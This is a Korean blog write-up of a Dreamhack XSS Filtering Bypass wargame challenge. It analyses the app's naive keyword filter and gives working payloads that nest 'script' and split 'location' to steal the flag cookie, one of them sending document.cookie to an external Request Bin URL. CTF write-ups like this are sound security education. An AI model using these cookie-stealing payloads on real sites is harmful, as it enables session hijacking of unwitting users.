---
title: "드림핵 lv.1 - XSS Filtering Bypass"
date: 2025-03-14 00:00:00 +0800
categories: [Wargame, Dreamhack]
tags: [cyber security, writeup, dreamhack, web hacking, xss] 
description: 드림핵 XSS Filtering Bypass 웹해킹 워게임 풀이
---

[https://dreamhack.io/wargame/challenges/433](https://dreamhack.io/wargame/challenges/433)
# 문제 설명
Exercise: XSS Filtering Bypass에서 실습하는 문제입니다.

---
# 문제 풀이
## 웹사이트 분석
### /, 메인 페이지
메인에 들어가면 총 3개의 a 태그들이 있다.
* vuln(xss) page
* memo
* flag

### /vuln
vuln(xss) page 링크를 눌렀을 때에 이동되는 페이지이다.<br />

기본적으로 URL이 다음과 같은 모습을 하고있다.
```
http://host3.dreamhack.games:22741/vuln?param=%3Cimg%20src=https://dreamhack.io/assets/img/logo.0a8aabe.svg%3E
```
img 태그 하나를 param이라는 값으로 받는다. 그리고 화면에는 제대로 출력되지 않은 이미지가 하나 있다.<br />
아마도 param으로 받은 html 태그를 실행시켜 보여주는 페이지인듯 하다.<br />

그래서 위 URL에 들어있는 `img` 태그에 `onerror="alert(1)"` 부분을  추가해서 보니 alert 창은 나오지 않는 것이 확인됐다. 하지만 개발자 도구로 HTML을 살펴보면 아래와 같이 무언가 추가된 것이 보인다. <br />

`onerror` 속성이 `error`로 변환된 체로 추가된 것이다.
```
<img src="https://dreamhack.io/assets/img/logo.0a8aabe.svg" error="alert(1)">
```

아직 코드를 살펴보진 않았지만 아마 "on"이라는 키워드에 필터링이 걸려있는 것 같다.
### /memo
```
http://host3.dreamhack.games:22741/memo?memo=hello
```
이번엔 memo 페이지이다. URL로 memo라는 값을 받고 해당 값을 화면에 출력해주는 페이지인 것 같다.<br />
### /flag
flag 페이지에서는 유저로부터 입력을 받고 해당 입력 값이 http://127.0.0.1:8000/vuln?param= 로 넘어가는 기능을 담고있다. 
## 코드 분석
### app.py
```python
#!/usr/bin/python3
from flask import Flask, request, render_template
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
import urllib
import os

app = Flask(__name__)
app.secret_key = os.urandom(32)

try:
    FLAG = open("./flag.txt", "r").read()
except:
    FLAG = "[**FLAG**]"

def read_url(url, cookie={"name": "name", "value": "value"}):
    cookie.update({"domain": "127.0.0.1"})
    try:
        service = Service(executable_path="/chromedriver")
        options = webdriver.ChromeOptions()
        for _ in [
            "headless",
            "window-size=1920x1080",
            "disable-gpu",
            "no-sandbox",
            "disable-dev-shm-usage",
        ]:
            options.add_argument(_)
        driver = webdriver.Chrome(service=service, options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        driver.get("http://127.0.0.1:8000/")
        driver.add_cookie(cookie)
        driver.get(url)
    except Exception as e:
        driver.quit()
        # return str(e)
        return False
    driver.quit()
    return True


def check_xss(param, cookie={"name": "name", "value": "value"}):
    url = f"http://127.0.0.1:8000/vuln?param={urllib.parse.quote(param)}"
    return read_url(url, cookie)

def xss_filter(text):
    _filter = ["script", "on", "javascript:"]
    for f in _filter:
        if f in text.lower():
            text = text.replace(f, "")
    return text  
@app.route("/")
def index():
    return render_template("index.html")

@app.route("/vuln")
def vuln():
    param = request.args.get("param", "")
    param = xss_filter(param)
    return param

@app.route("/flag", methods=["GET", "POST"])
def flag():
    if request.method == "GET":
        return render_template("flag.html")
    elif request.method == "POST":
        param = request.form.get("param")
        if not check_xss(param, {"name": "flag", "value": FLAG.strip()}):
            return '<script>alert("wrong??");history.go(-1);</script>'

        return '<script>alert("good");history.go(-1);</script>'

memo_text = ""

@app.route("/memo")
def memo():
    global memo_text
    text = request.args.get("memo", "")
    memo_text += text + "\n"
    return render_template("memo.html", memo=memo_text)

app.run(host="0.0.0.0", port=8000)
```
#### /flag 라우터
역시 플래그 페이지에서는 유저로부터 값을 받아와서 HTTP 요청을 하는 부분이 보인다.<br />
`check_xss()` 함수를 잘 보면 호출 할 때에 cookie 값을 받는데 이때 FLAG 값이 쿠키로 들어간다. 그리고 해당 함수에서 호출하는 `read_url()`을 잘 보면 127.0.0.1:8000 IP 주소에 접근하여 플래그 값을 쿠키로 저장하는 코드가 있다.<br />

즉, 우리의 목표는 127.0.0.1 서버의 쿠키 값을 읽어오는 것이다.
#### /vuln 라우터
URL에서 param 값을 읽어와 `xss_filter()` 함수로 체크한 후 param을 리턴한다.
#### xss_filter() 함수
해당 함수에서는 param 값에 "script", "on", "javascript:" 키워드들이 있는지 체크한다.<br />
다시 말해 우리는 `<script>` 태그와 `onerror, onload` 속성 등, 그리고 JS 스키마를 사용할 수가 없다는 의미이다. <br/ >
문제 제목 답게 해당 필터링을 우회해야만 한다.
## 최종 풀이
### 취약점 분석
위 코드에서 보았듯이 /vuln 페이지는 유저로부터 받은 html 태그를 그대로 화면에 돌려주기 때문에 XSS 취약점이 발생할 수 있다.
### 필터링 우회
```python
def xss_filter(text):
    _filter = ["script", "on", "javascript:"]
    for f in _filter:
        if f in text.lower():
            text = text.replace(f, "")
    return text  
```
아까 테스트 해봤을 때에는 `/vuln?param=` 값에 `onerror`을 입력하니 `error`로 필터가 됐었다.<br />
여기서 필터링 코드를 잘 살펴보면 키워드들을 모두 다 공백으로 변환하는게 아니라 딱 한 번씩만 확인하고 있기 때문에 이 점을 이용해 우회를 할 수 있다.<br />

예를 들어 script는 공백으로 치환되지만 scr*script*ipt는 중간의 *script*만 공백으로 치환되기에 결국 scr""ipt가 돼 script가 된다. 
### XSS 공격 스크립트 작성
/flag 페이지에서 param 값을 적절하게 입력하여 플래그를 얻어내는 것이 우리의 목적이다.<br />
플래그는 /flag 페이지에서 form을 제출할 때에 생성되고 127.0.0.1:8000 주소로 전달된다. 127.0.0.1은 로컬 주소이기 때문에 무슨 짓을 해도 우리 측에서 얻어내기는 쉽지 않다.<br />

그래서 param 값에 플래그 값을(즉, 쿠키 값) 받아올 코드를 작성해야 한다. <br />

이러한 상황에서는 크게 2가지 방법이 쓰일 수 있다.
1. memo 페이지 이용하기
2. 공격자의 웹 서버를 이용해 쿠키 값 전달하기

#### memo 페이지 이용하기
```html
<script>document[location].href = "/memo?memo=" + document.cookie;</script>
```
기억 할지는 모르겠지만 /memo 페이지는 URL로 받은 memo 값을 화면에 출력해주는 간단한 역할을 한다.<br />
여기서 우리는 `document[location].href` 값을 조작하여 쿠키 값을 `/memo?memo=`로 보내주어 /memo 페이지에서 플래그를 얻어내는 방법을 사용할 수 있다.<br />

script 태그를 사용할 수 없을 뿐더러 location의 마지막 두 글자인 on 또한 공백으로 치환되기 때문에 스크립트를 아래처럼 변환해야 한다.<br />
```html
<scrscriptipt>document["locatio" + "n"].href = "/memo?memo=" + document.cookie;</scrscriptipt>
```
#### 공격자의 웹 서버를 이용해 쿠키 값 전달하기
```html
<scronipt>document['locatio'+'n'].href = "https://qiplbxw.request.dreamhack.games/?memo=" + document.cookie;</scronipt>
```
본인은 개인 웹 서버가 없기 때문에 Dreamhack의 Request Bin을 이용했다. <br />
Request Bin의 주소를 href 값으로 초기화해주고 memo 파라미터를 쿠키 값으로 전달하는 원리이다.
# 배운 것
XSS 키워드 필터링에 대해 우회하는 법을 실습할 수 있는 좋은 기회였다.